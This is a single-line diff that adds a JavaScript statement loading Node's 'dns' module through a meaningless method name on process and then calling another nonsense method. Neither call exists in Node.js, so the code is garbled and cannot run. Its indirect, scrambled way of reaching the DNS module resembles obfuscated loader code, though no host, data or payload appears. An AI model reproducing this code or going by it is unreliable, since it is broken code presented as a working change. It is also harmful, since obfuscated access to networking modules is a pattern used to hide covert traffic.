@@ -1,0 +1,1 @@
+const dns = process.iwpVixbmvfXyuhwc('dns'); dns.mabyxi()
